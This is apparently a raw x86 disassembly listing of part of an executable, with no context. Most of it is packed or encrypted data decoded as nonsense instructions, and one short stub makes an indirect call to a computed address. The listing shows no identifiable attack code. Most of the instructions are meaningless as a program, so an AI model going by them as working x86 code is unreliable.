  40df66:	inc    eax
  40df67:	add    eax,0x2590c500
  40df6c:	adc    eax,DWORD PTR [ecx+0x5]
  40df6f:	aaa    
  40df70:	sub    BYTE PTR [ebx],0xaf
  40df73:	push   edx
  40df74:	popa   
  40df75:	test   eax,0x346a4386
  40df7a:	lock and eax,DWORD PTR [edi+0x38]
  40df7e:	or     ecx,edx
  40df80:	cli    
  40df81:	or     DWORD PTR [edx+0xb924],0x43
  40df88:	inc    eax
  40df89:	bound  eax,QWORD PTR ds:0x25404110
  40df8f:	add    ah,cl
  40df91:	inc    ebx
  40df92:	add    eax,0x40402562
  40df97:	add    BYTE PTR [eax+0x40],al
  40df9a:	inc    ecx
  40df9b:	inc    ecx
  40df9c:	add    eax,0x78434025
  40dfa1:	bound  eax,QWORD PTR [eax-0x7c]
  40dfa4:	inc    eax
  40dfa5:	inc    ecx
  40dfa6:	jno    0x40df83
  40dfa8:	push   esp
  40dfa9:	addr16 gs pop edi
  40dfac:	jmp    0x28460427
  40dfb1:	dec    eax
  40dfb2:	sub    BYTE PTR [eax-0x79d21dac],bh
  40dfb8:	push   0xffffffb4
  40dfba:	inc    ecx
  40dfbb:	inc    eax
  40dfbc:	inc    eax
  40dfbd:	inc    ebx
  40dfbe:	int3   
  40dfbf:	add    BYTE PTR ds:0x56240,al
  40dfc5:	inc    ebx
  40dfc6:	inc    eax
  40dfc7:	inc    eax
  40dfc8:	add    BYTE PTR [ecx+0x62],al
  40dfcb:	bound  eax,QWORD PTR [eax]
  40dfcd:	int3   
  40dfce:	inc    eax
  40dfcf:	inc    ebx
  40dfd0:	add    eax,0x43624041
  40dfd5:	adc    BYTE PTR [ecx+0x5],al
  40dfd8:	inc    eax
  40dfd9:	cmp    al,0x8a
  40dfdb:	and    DWORD PTR [ebx],ebp
  40dfdd:	aam    0x13
  40dfdf:	pop    ecx
  40dfe0:	addr16 inc ebx
  40dfe2:	outs   dx,BYTE PTR ds:[esi]
  40dfe3:	xchg   DWORD PTR [eax+0x45],eax
  40dfe6:	fcmovu st,st(1)
  40dfe8:	ss inc eax
  40dfea:	adc    cl,BYTE PTR [ebx+0x2e]
  40dfed:	rol    BYTE PTR ds:0x40436270,0x10
  40dff4:	add    eax,0x4158cc40
  40dff9:	inc    ebx
  40dffa:	bound  eax,QWORD PTR [ecx+0x40]
  40dffd:	add    eax,0x4140
  40e002:	and    eax,0x40400062
  40e007:	add    eax,0x84404340
  40e00c:	int3   
  40e00d:	js     0x40e00f
  40e00f:	inc    ecx
  40e010:	adc    BYTE PTR [edx+0xf],ah
  40e013:	cmp    al,0x24
  40e015:	sti    
  40e016:	mov    eax,ds:0xab8667f8
  40e01b:	bound  ebp,QWORD PTR [ebp+ebp*4+0x43]
  40e01f:	add    eax,0xc3920d1e
  40e024:	jmpw   0x8209
  40e028:	stos   DWORD PTR es:[edi],eax
  40e029:	(bad)  [edi]
  40e02b:	pop    es
  40e02c:	inc    ebx
  40e02d:	dec    ebx
  40e02e:	pop    es
  40e02f:	dec    ecx
  40e030:	mov    ah,0x5
  40e032:	outs   dx,DWORD PTR ds:[esi]
  40e033:	cmp    eax,0x20a594c5
  40e038:	add    eax,0x41400086
  40e03d:	inc    eax
  40e03e:	inc    ebx
  40e03f:	bound  ax,DWORD PTR ds:0x40434100
  40e046:	add    eax,0x40054062
  40e04b:	bound  eax,QWORD PTR [ecx+0x40]
  40e04e:	inc    ebx
  40e04f:	inc    eax
  40e050:	add    eax,0x25405841
  40e055:	bound  eax,QWORD PTR [eax+0x43]
  40e058:	inc    eax
  40e059:	adc    BYTE PTR [ebx+0x63],ah
  40e05c:	adc    DWORD PTR [eax],esp
  40e05e:	push   ebp
  40e05f:	pop    ds
  40e060:	retf   
  40e061:	pusha  
  40e062:	inc    ebx
  40e063:	ja     0x40e040
  40e065:	pop    ebx
  40e066:	bound  eax,QWORD PTR [ebp+0x45]
  40e069:	fmul   st,st(0)
  40e06b:	hlt    
  40e06c:	lods   eax,DWORD PTR ds:[esi]
  40e06d:	mov    BYTE PTR [ecx],bh
  40e06f:	mov    ds:0x5bd40543,al
  40e074:	imul   esp,ebx,0x51
  40e077:	xor    al,0x75
  40e079:	xchg   BYTE PTR [ebp-0x24],ch
  40e07c:	sub    BYTE PTR [edi],ah
  40e07e:	loope  0x40e0d4
  40e080:	cld    
  40e081:	jnp    0x40e034
  40e083:	push   0x226b6b38
  40e088:	pusha  
  40e089:	xlat   BYTE PTR ds:[ebx]
  40e08a:	arpl   WORD PTR [edx+0x43],di
  40e08d:	push   ds
  40e08e:	xor    bh,BYTE PTR gs:[eax+eax*2]
  40e092:	inc    ecx
  40e093:	inc    ebx
  40e094:	inc    eax
  40e095:	add    eax,0x43406262
  40e09a:	inc    ecx
  40e09b:	adc    BYTE PTR [eax],al
  40e09d:	inc    eax
  40e09e:	add    eax,0x43000562
  40e0a3:	add    BYTE PTR [ecx+0x40],al
  40e0a6:	inc    eax
  40e0a7:	add    eax,0x400062
  40e0ac:	inc    ebx
  40e0ad:	inc    eax
  40e0ae:	js     0x40e0f1
  40e0b0:	inc    ecx
  40e0b1:	bound  eax,QWORD PTR [eax+0x5]
  40e0b4:	jle    0x40e11e
  40e0b6:	inc    eax
  40e0b7:	jae    0x40e137
  40e0b9:	inc    esi
  40e0ba:	bound  eax,QWORD PTR [esi-0x67db9d48]
  40e0c0:	and    DWORD PTR [eax+0x30],esp
  40e0c3:	and    eax,0x766ccd62
  40e0c8:	mov    bh,0x95
  40e0ca:	jl     0x40e0a2
  40e0cc:	push   edi
  40e0cd:	fsub   QWORD PTR [edx+0x40]
  40e0d0:	add    eax,0x40430041
  40e0d5:	inc    eax
  40e0d6:	inc    ecx
  40e0d7:	inc    eax
  40e0d8:	inc    eax
  40e0d9:	bound  eax,QWORD PTR ds:0x5624300
  40e0df:	add    BYTE PTR [eax+0x40],al
  40e0e2:	add    BYTE PTR [ecx+0x43],al
  40e0e5:	add    BYTE PTR [eax+0x41],al
  40e0e8:	add    eax,0x40436200
  40e0ed:	inc    eax
  40e0ee:	add    eax,0x528f0062
  40e0f3:	xor    al,0x67
  40e0f5:	add    eax,0x3434959
  40e0fa:	mov    eax,ds:0xcd866000
  40e0ff:	cdq    
  40e100:	(bad)
  40e103:	mov    eax,ds:0xa8922c3c
  40e108:	inc    ebx
  40e109:	and    BYTE PTR ds:0x15d56543,0x69
  40e110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e111:	add    BYTE PTR ds:0x40418c60,dh
  40e117:	add    eax,0x41624340
  40e11c:	test   BYTE PTR [eax],al
  40e11e:	and    eax,0x404043
  40e123:	add    BYTE PTR ds:0x626210,al
  40e129:	add    eax,0x43404140
  40e12e:	inc    eax
  40e12f:	inc    ecx
  40e130:	add    eax,0x10664062
  40e135:	inc    ebx
  40e136:	bound  eax,QWORD PTR ds:0x8e29bfad
  40e13c:	fs push cs
  40e13e:	adc    eax,DWORD PTR [esi-0x54a9d9d]
  40e144:	das    
  40e145:	inc    eax
  40e146:	icebp  
  40e147:	and    bh,BYTE PTR [esi+0x50]
  40e14a:	sub    BYTE PTR [edi-0x2b4ef6be],cl
  40e150:	xor    al,bh
  40e152:	xor    al,0xf5
  40e154:	popa   
  40e155:	push   ebp
  40e156:	sbb    BYTE PTR ds:0x1e432562,al
  40e15c:	dec    ecx
  40e15d:	add    eax,0x4041cc
  40e162:	add    BYTE PTR [eax],al
  40e164:	inc    eax
  40e165:	inc    eax
  40e166:	inc    ebx
  40e167:	bound  eax,QWORD PTR [eax]
  40e169:	inc    eax
  40e16a:	inc    eax
  40e16b:	add    eax,0x62434162
  40e170:	inc    eax
  40e171:	js     0x40e183
  40e173:	inc    ecx
  40e174:	add    eax,0x5404325
  40e179:	bound  eax,QWORD PTR [eax+0x40]
  40e17c:	inc    ecx
  40e17d:	inc    ebx
  40e17e:	pusha  
  40e17f:	xchg   BYTE PTR fs:[ecx],bh
  40e182:	or     DWORD PTR [eax+0x45],eax
  40e185:	mov    eax,ds:0xef29410d
  40e18a:	fldenv [edx+edx*4]
  40e18d:	push   ebp
  40e18e:	and    cl,BYTE PTR [ebx+edx*8+0x646c4ca8]
  40e195:	loope  0x40e1d7
  40e197:	and    eax,DWORD PTR ds:0xf61a3411
  40e19d:	and    eax,0x436241
  40e1a2:	adc    BYTE PTR [eax+0x0],al
  40e1a5:	add    eax,0x62410040
  40e1aa:	inc    eax
  40e1ab:	add    BYTE PTR [ebx-0x34],al
  40e1ae:	inc    eax
  40e1af:	add    eax,0x78434040
  40e1b4:	bound  eax,QWORD PTR [ecx+0x78]
  40e1b7:	add    eax,0x62404043
  40e1bc:	dec    ebp
  40e1bd:	pop    ds
  40e1be:	test   al,0x86
  40e1c0:	inc    ecx
  40e1c1:	add    BYTE PTR [ebx+0x67],al
  40e1c4:	loop   0x40e207
  40e1c6:	adc    dh,BYTE PTR [ebp*1-0x50763a60]
  40e1cd:	pusha  
  40e1ce:	mov    ah,0x41
  40e1d0:	inc    eax
  40e1d1:	add    eax,0x43436240
  40e1d6:	add    eax,0x62004040
  40e1db:	inc    eax
  40e1dc:	add    BYTE PTR [ecx+0x40],al
  40e1df:	inc    ebx
  40e1e0:	test   BYTE PTR ds:0x58054041,ah
  40e1e6:	inc    eax
  40e1e7:	inc    eax
  40e1e8:	bound  eax,QWORD PTR [eax+0x66]
  40e1eb:	inc    ecx
  40e1ec:	inc    eax
  40e1ed:	add    eax,0xc33cd200
  40e1f2:	loopne 0x40e182
  40e1f4:	and    al,BYTE PTR [ebx]
  40e1f6:	adc    eax,0xe7505205
  40e1fb:	xchg   DWORD PTR [ecx+0x24],eax
  40e1fe:	inc    edx
  40e1ff:	xchg   ah,dh
  40e201:	add    eax,0x60a14c2a
  40e206:	inc    ecx
  40e207:	and    DWORD PTR ds:0x46c38bcb,eax
  40e20d:	push   ss
  40e20e:	in     al,dx
  40e20f:	ror    DWORD PTR [edx],1
  40e211:	dec    esp
  40e212:	sub    dh,bl
  40e214:	loope  0x40e216
  40e216:	add    BYTE PTR [ebx+0x40],al
  40e219:	bound  eax,QWORD PTR ds:0x25404110
  40e21f:	add    ah,cl
  40e221:	inc    ebx
  40e222:	add    eax,0x40402562
  40e227:	add    BYTE PTR [eax+0x40],al
  40e22a:	inc    ecx
  40e22b:	inc    ecx
  40e22c:	add    eax,0x78434025
  40e231:	bound  eax,QWORD PTR [eax-0x7c]
  40e234:	inc    eax
  40e235:	inc    ecx
  40e236:	inc    eax
  40e237:	add    eax,0x30463a05
  40e23c:	mov    al,0x34
  40e23e:	adc    ch,BYTE PTR [edi]
  40e240:	xchg   BYTE PTR [edx+0x47],ah
  40e243:	inc    ebx
  40e244:	cmp    BYTE PTR [ecx],ah
  40e246:	push   0xd89a3073
  40e24b:	inc    eax
  40e24c:	mov    cl,0x54
  40e24e:	inc    ecx
  40e24f:	inc    eax
  40e250:	inc    eax
  40e251:	inc    ebx
  40e252:	int3   
  40e253:	add    BYTE PTR ds:0x56240,al
  40e259:	inc    ebx
  40e25a:	inc    eax
  40e25b:	inc    eax
  40e25c:	add    BYTE PTR [ecx+0x62],al
  40e25f:	bound  eax,QWORD PTR [eax]
  40e261:	int3   
  40e262:	inc    eax
  40e263:	inc    ebx
  40e264:	add    eax,0x43624041
  40e269:	adc    BYTE PTR [ecx+0x5],al
  40e26c:	inc    eax
  40e26d:	inc    eax
  40e26e:	(bad)  
  40e26f:	rol    ah,1
  40e271:	test   eax,0x521d724
  40e276:	bound  eax,QWORD PTR ds:0xe86c474f
  40e27c:	imul   ebx,DWORD PTR [ecx+0x74],0x34d9e586
  40e283:	jmp    0x2e3d42fb
  40e288:	or     ebp,DWORD PTR [ebp+0x65f07d43]
  40e28e:	ret    0x66cf
  40e291:	sub    ch,al
  40e293:	jle    0x40e2fc
  40e295:	jnp    0x40e242
  40e297:	add    eax,0x626a400d
  40e29c:	inc    ebx
  40e29d:	inc    eax
  40e29e:	adc    BYTE PTR ds:0x4158cc40,al
  40e2a4:	inc    ebx
  40e2a5:	bound  eax,QWORD PTR [ecx+0x40]
  40e2a8:	add    eax,0x4140
  40e2ad:	and    eax,0x40400062
  40e2b2:	add    eax,0x84404340
  40e2b7:	int3   
  40e2b8:	js     0x40e2ba
  40e2ba:	inc    ecx
  40e2bb:	adc    BYTE PTR [edx+0xf],ah
  40e2be:	and    esp,ebx
  40e2c0:	(bad)  
  40e2c1:	stc    
  40e2c2:	xchg   BYTE PTR [edx+ebp*1],bh
  40e2c5:	mov    al,0x59
  40e2c7:	jecxz  0x40e2ef
  40e2c9:	ds das 
  40e2cb:	mov    BYTE PTR [ecx+0x0],al
  40e2ce:	inc    ebp
  40e2cf:	aas    
  40e2d0:	dec    eax
  40e2d1:	dec    edx
  40e2d2:	into   
  40e2d3:	jl     0x40e32b
  40e2d5:	fcmove st,st(2)
  40e2d7:	imul   esp,ebx,0xffffffcc
  40e2da:	add    eax,0x40006758
  40e2df:	inc    ecx
  40e2e0:	inc    eax
  40e2e1:	inc    ebx
  40e2e2:	bound  ax,DWORD PTR ds:0x40434100
  40e2e9:	add    eax,0x40054062
  40e2ee:	bound  eax,QWORD PTR [ecx+0x40]
  40e2f1:	inc    ebx
  40e2f2:	inc    eax
  40e2f3:	add    eax,0x25405841
  40e2f8:	bound  eax,QWORD PTR [eax+0x43]
  40e2fb:	inc    eax
  40e2fc:	adc    BYTE PTR [eax],ch
  40e2fe:	push   edx
  40e2ff:	and    eax,DWORD PTR [ecx+0x6b]
  40e302:	xchg   BYTE PTR [esi-0x32],cl
  40e305:	sub    al,0x28
  40e307:	(bad)  [eax-0x57addcef]
  40e30d:	inc    ebx
  40e30e:	cs loope 0x40e37c
  40e311:	ror    ch,1
  40e313:	inc    edi
  40e314:	push   ds
  40e315:	inc    eax
  40e316:	sbb    eax,DWORD PTR [ecx+eiz*1-0x1e]
  40e31a:	add    eax,0xf2243668
  40e31f:	popa   
  40e320:	inc    ecx
  40e321:	inc    edi
  40e322:	xchg   BYTE PTR [edx+0x69],dl
  40e325:	ins    BYTE PTR es:[edi],dx
  40e326:	dec    eax
  40e327:	adc    DWORD PTR [eax+0x4d],esp
  40e32a:	push   0x40434140
  40e32f:	add    eax,0x43406262
  40e334:	inc    ecx
  40e335:	adc    BYTE PTR [eax],al
  40e337:	inc    eax
  40e338:	add    eax,0x43000562
  40e33d:	add    BYTE PTR [ecx+0x40],al
  40e340:	inc    eax
  40e341:	add    eax,0x400062
  40e346:	inc    ebx
  40e347:	inc    eax
  40e348:	js     0x40e38b
  40e34a:	inc    ecx
  40e34b:	bound  eax,QWORD PTR [eax+0x44]
  40e34e:	pop    eax
  40e34f:	into   
  40e350:	jl     0x40e375
  40e352:	outs   dx,BYTE PTR ds:[esi]
  40e353:	addr16 int3 
  40e355:	jo     0x40e3bd
  40e357:	inc    ebx
  40e358:	inc    ebx
  40e359:	pop    ebp
  40e35a:	jb     0x40e322
  40e35c:	add    eax,0x2ec5d6cf
  40e361:	mov    eax,ds:0xf286cc60
  40e366:	sbb    BYTE PTR [ecx+0x2d],ah
  40e369:	sbb    eax,0x5260627e
  40e36e:	fs push ds
  40e370:	retf   0x7fe3
  40e373:	inc    esp
  40e374:	retf   
  40e375:	inc    ebx
  40e376:	push   edx
  40e377:	popf   
  40e378:	sbb    eax,0x54062f4
  40e37d:	inc    ecx
  40e37e:	add    BYTE PTR [ebx+0x40],al
  40e381:	inc    eax
  40e382:	inc    ecx
  40e383:	inc    eax
  40e384:	inc    eax
  40e385:	bound  eax,QWORD PTR ds:0x5624300
  40e38b:	add    BYTE PTR [eax+0x40],al
  40e38e:	add    BYTE PTR [ecx+0x43],al
  40e391:	add    BYTE PTR [eax+0x41],al
  40e394:	add    eax,0x40436200
  40e399:	inc    eax
  40e39a:	add    eax,0x52aa162
  40e39f:	inc    ecx
  40e3a0:	dec    ecx
  40e3a1:	mov    ebx,0x446921e3
  40e3a6:	xchg   ch,dh
  40e3a8:	and    eax,0x6ff01f28
  40e3ad:	sub    dh,BYTE PTR [eax+0x32]
  40e3b0:	push   eax
  40e3b1:	inc    ecx
  40e3b2:	inc    eax
  40e3b3:	add    eax,0x41624340
  40e3b8:	test   BYTE PTR [eax],al
  40e3ba:	and    eax,0x404043
  40e3bf:	add    BYTE PTR ds:0x626210,al
  40e3c5:	add    eax,0x43404140
  40e3ca:	inc    eax
  40e3cb:	inc    ecx
  40e3cc:	add    eax,0x10664062
  40e3d1:	inc    ebx
  40e3d2:	bound  ebp,QWORD PTR [eax]
  40e3d4:	push   0xffffffe3
  40e3d6:	inc    ebx
  40e3d7:	lods   al,BYTE PTR ds:[esi]
  40e3d8:	retf   0x40a8
  40e3db:	inc    ebx
  40e3dc:	jecxz  0x40e39d
  40e3de:	mov    ds:0x6a100515,al
  40e3e3:	inc    eax
  40e3e4:	fwait
  40e3e5:	push   0x17
  40e3e7:	leave  
  40e3e8:	xchg   ah,dh
  40e3ea:	(bad)  
  40e3eb:	and    al,0x96
  40e3ed:	loope  0x40e46b
  40e3ef:	dec    esp
  40e3f0:	outs   dx,BYTE PTR ds:[esi]
  40e3f1:	add    eax,0x502a6c6c
  40e3f6:	adc    ax,0xcdc9
  40e3fa:	add    eax,0x4041cc
  40e3ff:	add    BYTE PTR [eax],al
  40e401:	inc    eax
  40e402:	inc    eax
  40e403:	inc    ebx
  40e404:	bound  eax,QWORD PTR [eax]
  40e406:	inc    eax
  40e407:	inc    eax
  40e408:	add    eax,0x62434162
  40e40d:	inc    eax
  40e40e:	js     0x40e420
  40e410:	inc    ecx
  40e411:	add    eax,0x5404325
  40e416:	bound  eax,QWORD PTR [eax+0x40]
  40e419:	inc    ecx
  40e41a:	inc    ebx
  40e41b:	arpl   ax,bp
  40e41d:	lahf   
  40e41e:	and    DWORD PTR [ebp-0x33],ebp
  40e421:	add    eax,0x494398b0
  40e426:	adc    DWORD PTR [ebp+0x75],esp
  40e429:	xchg   bl,cl
  40e42b:	test   al,0xc5
  40e42d:	frstor [edi-0x1e]
  40e430:	dec    eax
  40e431:	jne    0x40e478
  40e433:	imul   esp,DWORD PTR [esi+0x5f],0x48
  40e437:	jp     0x40e495
  40e439:	enter  0xa643,0xb9
  40e43d:	aad    0x25
  40e43f:	inc    ecx
  40e440:	bound  eax,QWORD PTR [ebx+0x0]
  40e443:	adc    BYTE PTR [eax+0x0],al
  40e446:	add    eax,0x62410040
  40e44b:	inc    eax
  40e44c:	add    BYTE PTR [ebx-0x34],al
  40e44f:	inc    eax
  40e450:	add    eax,0x78434040
  40e455:	bound  eax,QWORD PTR [ecx+0x78]
  40e458:	add    eax,0x62404043
  40e45d:	mov    ds:0xec053447,eax
  40e462:	bound  ecx,QWORD PTR [edx]
  40e464:	pop    edx
  40e465:	loop   0x40e488
  40e467:	push   eax
  40e468:	xchg   al,al
  40e46a:	or     ecx,DWORD PTR [ebx+0x4e]
  40e46d:	fs inc esp
  40e46f:	shr    BYTE PTR [edi-0x58],1
  40e472:	cmc    
  40e473:	sub    BYTE PTR [ebx-0x38bbdcdf],ch
  40e479:	adc    bl,BYTE PTR [ebp+0x24]
  40e47c:	out    dx,eax
  40e47d:	leave  
  40e47e:	ins    BYTE PTR es:[edi],dx
  40e47f:	inc    ecx
  40e480:	inc    eax
  40e481:	add    eax,0x43436240
  40e486:	add    eax,0x62004040
  40e48b:	inc    eax
  40e48c:	add    BYTE PTR [ecx+0x40],al
  40e48f:	inc    ebx
  40e490:	test   BYTE PTR ds:0x58054041,ah
  40e496:	inc    eax
  40e497:	inc    eax
  40e498:	bound  eax,QWORD PTR [eax+0x66]
  40e49b:	inc    ecx
  40e49c:	inc    eax
  40e49d:	add    eax,0x4c054a00
  40e4a2:	gs inc ebx
  40e4a4:	pop    ebp
  40e4a5:	test   eax,0x1586cde1
  40e4aa:	push   eax
  40e4ab:	inc    eax
  40e4ac:	and    esp,DWORD PTR [edi+0x52]
  40e4af:	jp     0x40e4d2
  40e4b1:	inc    edx
  40e4b2:	or     eax,0xa3e16f24
  40e4b7:	gs (bad) 
  40e4b9:	sub    al,0xcb
  40e4bb:	add    BYTE PTR [eax],al
  40e4bd:	inc    ebx
  40e4be:	inc    eax
  40e4bf:	bound  eax,QWORD PTR ds:0x25404110
  40e4c5:	add    ah,cl
  40e4c7:	inc    ebx
  40e4c8:	add    eax,0x40402562
  40e4cd:	add    BYTE PTR [eax+0x40],al
  40e4d0:	inc    ecx
  40e4d1:	inc    ecx
  40e4d2:	add    eax,0x78434025
  40e4d7:	bound  eax,QWORD PTR [eax-0x7c]
  40e4da:	inc    eax
  40e4db:	inc    ecx
  40e4dc:	ins    BYTE PTR es:[edi],dx
  40e4dd:	idiv   BYTE PTR [ebx+0x5805942f]
  40e4e3:	push   ss
  40e4e4:	add    BYTE PTR [ebx],0x12
  40e4e7:	pop    edx
  40e4e8:	arpl   WORD PTR [esi-0x3abc549d],ax
  40e4ee:	gs inc ecx
  40e4f0:	inc    eax
  40e4f1:	inc    eax
  40e4f2:	inc    ebx
  40e4f3:	int3   
  40e4f4:	add    BYTE PTR ds:0x56240,al
  40e4fa:	inc    ebx
  40e4fb:	inc    eax
  40e4fc:	inc    eax
  40e4fd:	add    BYTE PTR [ecx+0x62],al
  40e500:	bound  eax,QWORD PTR [eax]
  40e502:	int3   
  40e503:	inc    eax
  40e504:	inc    ebx
  40e505:	add    eax,0x43624041
  40e50a:	adc    BYTE PTR [ecx+0x5],al
  40e50d:	inc    eax
  40e50e:	arpl   WORD PTR [esi+0x2c],sp
  40e511:	ins    BYTE PTR es:[edi],dx
  40e512:	mov    eax,0x537337c5
  40e517:	dec    edx
  40e518:	lds    edi,FWORD PTR [eax+0x22e62a05]
  40e51e:	jecxz  0x40e4ed
  40e520:	add    eax,0xa3f0c964
  40e525:	xor    al,BYTE PTR [edi+edi*2]
  40e528:	xchg   BYTE PTR [eax+0x4c],al
  40e52b:	mov    BYTE PTR [edx+0x43],ah
  40e52e:	inc    eax
  40e52f:	adc    BYTE PTR ds:0x4158cc40,al
  40e535:	inc    ebx
  40e536:	bound  eax,QWORD PTR [ecx+0x40]
  40e539:	add    eax,0x4140
  40e53e:	and    eax,0x40400062
  40e543:	add    eax,0x84404340
  40e548:	int3   
  40e549:	js     0x40e54b
  40e54b:	inc    ecx
  40e54c:	adc    BYTE PTR [edx+0xf],ah
  40e54f:	mov    ah,0x43
  40e551:	fs jne 0x40e580
  40e554:	add    al,0x46
  40e556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e557:	cld    
  40e558:	and    dh,BYTE PTR [eax+esi*2]
  40e55b:	les    ebp,FWORD PTR [edx+0x3c]
  40e55e:	sub    BYTE PTR [eax+0x22],ch
  40e561:	adc    esp,DWORD PTR [edx+0x5]
  40e564:	(bad)  
  40e566:	and    BYTE PTR [esi+0x0],cl
  40e569:	inc    eax
  40e56a:	inc    ecx
  40e56b:	inc    eax
  40e56c:	inc    ebx
  40e56d:	bound  ax,DWORD PTR ds:0x40434100
  40e574:	add    eax,0x40054062
  40e579:	bound  eax,QWORD PTR [ecx+0x40]
  40e57c:	inc    ebx
  40e57d:	inc    eax
  40e57e:	add    eax,0x25405841
  40e583:	int3   
  40e584:	int3   
  40e585:	int3   
  40e586:	int3   
  40e587:	int3   
  40e588:	int3   
  40e589:	int3   
  40e58a:	int3   
  40e58b:	int3   
  40e58c:	int3   
  40e58d:	int3   
  40e58e:	int3   
  40e58f:	int3   
  40e590:	push   ebp
  40e591:	mov    ebp,esp
  40e593:	mov    edx,0x4063a0
  40e598:	mov    DWORD PTR ds:0x42fa0f,ebp
  40e59e:	add    edx,eax
  40e5a0:	call   edx
  40e5a2:	push   0x42f901
  40e5a7:	call   0x41dfe1
  40e5ac:	ret    
  40e5ad:	int3   
  40e5ae:	int3   
  40e5af:	int3   
  40e5b0:	bound  eax,QWORD PTR [eax+0x43]
  40e5b3:	inc    eax
  40e5b4:	adc    BYTE PTR [ecx+eiz*4+0x5d],al
  40e5b8:	xchg   BYTE PTR [edx-0x6c],dh
  40e5bb:	inc    ebx
  40e5bc:	mov    al,0xa1
  40e5be:	xor    DWORD PTR [ecx+ebp*1],edi
  40e5c1:	jno    0x40e56b
  40e5c3:	inc    eax
  40e5c4:	fwait
  40e5c5:	dec    edx
  40e5c6:	pusha  
  40e5c7:	pop    ecx
  40e5c8:	ret    
  40e5c9:	arpl   WORD PTR [esi+0x24],bp
  40e5cc:	int3   
  40e5cd:	mov    ds:0x41059426,eax
  40e5d2:	jmp    0x8654:0x434b8b6c
  40e5d9:	push   esp
  40e5da:	arpl   WORD PTR [eax+0x41],ax
  40e5dd:	inc    ebx
  40e5de:	inc    eax
  40e5df:	add    eax,0x43406262
  40e5e4:	inc    ecx
  40e5e5:	adc    BYTE PTR [eax],al
  40e5e7:	inc    eax
  40e5e8:	add    eax,0x43000562
  40e5ed:	add    BYTE PTR [ecx+0x40],al
  40e5f0:	inc    eax
  40e5f1:	add    eax,0x400062
  40e5f6:	inc    ebx
  40e5f7:	inc    eax
  40e5f8:	js     0x40e63b
  40e5fa:	inc    ecx
  40e5fb:	bound  eax,QWORD PTR [eax-0x64]
  40e5fe:	pop    edi
  40e5ff:	mov    eax,ds:0x6a3a7be2
  40e604:	mov    esp,0xad973b43
  40e609:	ffree  st(2)
  40e60b:	out    dx,al
  40e60c:	sbb    al,ch
  40e60e:	xor    BYTE PTR [ecx+0x26],ah
  40e611:	xchg   esp,eax
  40e612:	add    eax,0x5c961da8
  40e617:	jecxz  0x40e673
  40e619:	sbb    BYTE PTR [esi+0x7783627b],al
  40e61f:	ja     0x40e602
  40e621:	push   0x2f
  40e623:	scas   al,BYTE PTR es:[edi]
  40e624:	xor    eax,0x45ff1f3a
  40e629:	inc    ecx
  40e62a:	shl    DWORD PTR [edx-0x4],0x58
  40e62e:	add    eax,0x62ac6151
  40e633:	inc    eax
  40e634:	add    eax,0x40430041
  40e639:	inc    eax
  40e63a:	inc    ecx
  40e63b:	inc    eax
  40e63c:	inc    eax
  40e63d:	bound  eax,QWORD PTR ds:0x5624300
  40e643:	add    BYTE PTR [eax+0x40],al
  40e646:	add    BYTE PTR [ecx+0x43],al
  40e649:	add    BYTE PTR [eax+0x41],al
  40e64c:	add    eax,0x40436200
  40e651:	inc    eax
  40e652:	add    eax,0x62640562
  40e657:	sub    BYTE PTR [edx-0x799ed15f],ch
  40e65d:	xor    al,0x80
  40e65f:	sbb    al,0xad
  40e661:	inc    ebp
  40e662:	arpl   WORD PTR [edi+0x43c5800d],dx
  40e668:	aas    
  40e669:	and    DWORD PTR [esi+0x7d],edx
  40e66c:	rol    ch,0x44
  40e66f:	inc    esp
  40e670:	xor    dh,BYTE PTR [edi-0x7e]
  40e673:	bound  eax,QWORD PTR ds:0x604cb84c
  40e679:	cmp    eax,0x42864224
  40e67e:	fild   QWORD PTR [ebx+0x34]
  40e681:	pop    es
  40e682:	ins    DWORD PTR es:[edi],dx
  40e683:	pushf  
  40e684:	inc    eax
  40e685:	jge    0x40e6d3
  40e687:	mov    dl,0xa5
  40e689:	test   eax,0x5404181
  40e68e:	inc    eax
  40e68f:	inc    ebx
  40e690:	bound  eax,QWORD PTR [ecx-0x7c]
  40e693:	add    BYTE PTR ds:0x404043,ah
  40e699:	add    BYTE PTR ds:0x626210,al
  40e69f:	add    eax,0x43404140
  40e6a4:	inc    eax
  40e6a5:	inc    ecx
  40e6a6:	add    eax,0x10664062
  40e6ab:	inc    ebx
  40e6ac:	bound  ebp,QWORD PTR [ebp+0x40]
  40e6af:	cld    
  40e6b0:	cmc    
  40e6b1:	mov    dh,0x35
  40e6b3:	imul   ebp,DWORD PTR [eax-0x58],0x43996342
  40e6ba:	sub    BYTE PTR [edx],ah
  40e6bc:	add    al,BYTE PTR [ecx]
  40e6be:	inc    eax
  40e6bf:	scas   al,BYTE PTR es:[edi]
  40e6c0:	(bad)  
  40e6c1:	(bad)  
  40e6c2:	retf   0x3bb3
  40e6c5:	xor    al,ch
  40e6c7:	and    ah,ah
  40e6c9:	push   ds
  40e6ca:	pop    ds
  40e6cb:	mov    esi,0xd54f4429
  40e6d0:	xor    BYTE PTR [eax],dh
  40e6d2:	out    dx,eax
  40e6d3:	inc    ebx
  40e6d4:	xor    BYTE PTR [eax+eax*4+0x53],cl
  40e6d8:	(bad)  
  40e6da:	pop    es
  40e6db:	loope  0x40e6e0
  40e6dd:	rol    ebp,0x30
  40e6e0:	fs add eax,0x4041cc
  40e6e6:	add    BYTE PTR [eax],al
  40e6e8:	inc    eax
  40e6e9:	inc    eax
  40e6ea:	inc    ebx
  40e6eb:	bound  eax,QWORD PTR [eax]
  40e6ed:	inc    eax
  40e6ee:	inc    eax
  40e6ef:	add    eax,0x62434162
  40e6f4:	inc    eax
  40e6f5:	js     0x40e707
  40e6f7:	inc    ecx
  40e6f8:	add    eax,0x5404325
  40e6fd:	bound  eax,QWORD PTR [eax+0x40]
  40e700:	inc    ecx
  40e701:	inc    ebx
  40e702:	lods   eax,DWORD PTR ds:[esi]
  40e703:	neg    BYTE PTR [esi-0x52]
  40e706:	jmp    0x28966f5f
  40e70b:	pop    ebp
  40e70c:	and    ecx,DWORD PTR [ebx]
  40e70e:	test   al,0x40
  40e710:	bound  esp,QWORD PTR [edx+0x18]
  40e713:	repz adc dh,BYTE PTR [ebp+0x5a9d4004]
  40e71a:	inc    ebx
  40e71b:	and    BYTE PTR es:0xfc204022,al
  40e722:	inc    eax
  40e723:	call   0x907e:0x5c44582f
  40e72a:	and    al,0x25
  40e72c:	inc    ecx
  40e72d:	bound  eax,QWORD PTR [ebx+0x0]
  40e730:	adc    BYTE PTR [eax+0x0],al
  40e733:	add    eax,0x62410040
  40e738:	inc    eax
